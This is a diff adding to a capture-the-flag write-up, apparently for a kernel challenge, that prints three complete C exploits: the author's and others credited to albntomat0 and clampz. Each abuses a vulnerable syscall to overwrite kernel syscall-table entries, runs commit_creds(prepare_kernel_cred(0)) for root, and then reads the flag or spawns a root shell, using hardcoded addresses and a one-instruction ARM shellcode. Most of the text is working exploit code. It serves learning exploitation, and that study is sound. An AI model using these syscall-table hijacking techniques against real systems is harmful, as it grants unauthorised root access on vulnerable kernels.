@@ -385,3 +385,192 @@ Code: 0000 0000 f56c 8003 (f924) 8003
 
 removed the `commit_creds` and I got the error `/bin/sh: can't access tty; job control turned off` so I `cat` the flag instead.
 the problem is that I fail to return from `commit_creds` or from `prepare_kernel_creds`.
+
+I called the functions using function pointers and it worked :)
+```C
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define EXPLOIT 222
+#define SYS_UPPER 223
+#define SYS_CALL_TABLE 0x8000e348
+
+int (*commit_creds)(unsigned long cred);
+unsigned long (*prepare_kernel_cred)(unsigned long cred);
+
+SYSCALL_DEFINE2() {
+    prepare_kernel_cred = 0x8003f924;
+    commit_creds = 0x8003f56c;
+    // privileges escelation to root
+    commit_creds(prepare_kernel_cred(0));    
+    return 0;  
+}
+
+int main(int argc, char *argv[]) {
+    unsigned int** syscall_table = (unsigned int**)SYS_CALL_TABLE;
+    char *entry_value = "\x89\x01\x03\x01";
+    int hook_address = 0;
+    
+    // overwrite an empty syscall
+    syscall(SYS_UPPER, entry_value, &syscall_table[EXPLOIT]);
+    syscall(SYS_UPPER, &syscall_table[EXPLOIT], (char *)&hook_address);
+    printf("[*] hook address: %p\n", (int *)hook_address);
+
+    // triger hook and elevate privileges
+    syscall(EXPLOIT);
+
+    system("/bin/cat /root/flag");
+    return 0;
+}
+
+/* 
+gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
+*/
+```
+
+
+# writeups
+
+## albntomat0
+
+basically improving write & read to be able to write null, then creating a syscall for each function, `commit_creds` and `prepare_kernel_creds`.
+`Uses the problems syscall to add in syscalls to __copy_from_user and __copy_to_user, as commit creds has a 0x6c in it. Then, uses improved read/write to add syscalls to prepare_creds() and commit_creds(). Finally, calls commit_creds(prepare_creds(0)).`
+```C
+#include <stdio.h>
+#include <unistd.h>
+
+#define SYS_CALL_TABLE	0x8000e348		// manually configure this address!!
+#define NR_SYS_UNUSED	223
+#define COMMIT_CREDS_ADDR 0x8003f56c
+#define PREPARE_CREDS_ADDR 0x8003f924
+#define SYSCALL_NUM_PREP_CREDS 7
+#define SYSCALL_NUM_COMMIT_CREDS 18
+#define SYSCALL_NUM_READ 0x1c
+#define SYSCALL_NUM_WRITE 0x20
+#define COPY_FROM_USER_ADDR 0x8018dd80
+#define COPY_TO_USER_ADDR 0x8018e1a0
+
+struct memory_abuse {
+   int a;
+   char end;
+};
+
+void kwrite(void * src, void * dest){
+  syscall(NR_SYS_UNUSED, src, dest);
+}
+
+int kread_int(void * target){
+  char buff[4096];
+  syscall(NR_SYS_UNUSED, target, &buff);
+  return *(int *)buff;
+}
+
+void kwritev2(void * addr, int val){
+  int temp = val;
+  syscall(SYSCALL_NUM_WRITE, addr, &temp, sizeof(int));
+}
+
+int kread_intv2(void * target){
+  int temp;
+  syscall(SYSCALL_NUM_READ, &temp, target, sizeof(int));
+  return temp;
+}
+
+int main(){
+  //Goal: Call commit_creds(prepare_kernel_cred(0))
+  struct memory_abuse temp;
+  temp.end = 0;
+
+  //Update to better write
+  printf("Trying to get better Write\n");
+  temp.a = COPY_FROM_USER_ADDR;
+  kwrite( &(temp.a), (void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_WRITE));
+  printf("Write Done\n");
+  int res = kread_int((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_WRITE));
+  printf("res %x target %x\n", res, COPY_FROM_USER_ADDR);
+
+  //Update to get better read
+  kwritev2((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_READ),COPY_TO_USER_ADDR);
+  printf("Read done\n");
+  res = kread_int((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_READ));
+  printf("res %x target %x\n", res, COPY_TO_USER_ADDR);
+  res = kread_intv2((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_READ));
+  printf("res %x target %x\n", res, COPY_TO_USER_ADDR);
+
+  //Get reference to prep creds
+  printf("Setting prep creds\n");
+  kwritev2((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_PREP_CREDS),PREPARE_CREDS_ADDR);
+  res = kread_intv2((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_PREP_CREDS));
+  printf("res %x target %x\n", res, PREPARE_CREDS_ADDR);
+
+  //Get ref to commit creds
+  printf("Setting commit creds\n");
+  kwritev2((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_COMMIT_CREDS),COMMIT_CREDS_ADDR);
+  res = kread_intv2((void *)(SYS_CALL_TABLE + 4 * SYSCALL_NUM_COMMIT_CREDS));
+  printf("res %x target %x\n", res, COMMIT_CREDS_ADDR);
+
+  printf("Going for broke\n");
+  res = syscall(SYSCALL_NUM_PREP_CREDS, 0);
+  printf("Got %x\n", res);
+  syscall(SYSCALL_NUM_COMMIT_CREDS, res);
+  system("/bin/sh");
+
+  return 0;
+}
+
+```
+
+
+## cd80
+used `mmap` to solve address problem, and did the same as I.
+
+## clampz
+```C
+// clampz
+#define _GNU_SOURCE    
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+
+#define SYS_UPPER 223  
+
+struct cred;
+struct task_struct;
+
+typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
+  __attribute__((regparm(3)));
+typedef int (*commit_creds_t)(struct cred *new)
+  __attribute__((regparm(3)));
+
+prepare_kernel_cred_t prepare_kernel_cred;
+commit_creds_t commit_creds;
+
+static void kernel_code(void)
+{
+    commit_creds(prepare_kernel_cred(0));
+    return;
+}
+
+char shellcode[] = "\x01\xf0\xa0\xe1";  // mov pc, r1                                          
+
+void main() {
+        prepare_kernel_cred = 0x8003f924;
+        commit_creds = 0x8003f56c;
+        syscall(SYS_UPPER, shellcode, 0x7f000000);
+        puts("[*] overwrote syscall sys_upper with shellcode\n");
+        syscall(SYS_UPPER, 0x7f000000, kernel_code);
+        puts("[+] got r00t?\n");
+        system("/bin/sh");
+}
+```
+
+# The right thinking flow
+
+1. vulnerability - I can read and write to any location, moreover the syscall table is mapped to a writeable page
+2. goal - I can call `commit_creds(prepare_kernel_cred(0))`  inside kernel mode, then use the elevated privileges to cat the flag.
+3. abilities - I can create new `syscalls`
+    1. with my own code.
+    2. with functions from inside the kernel.
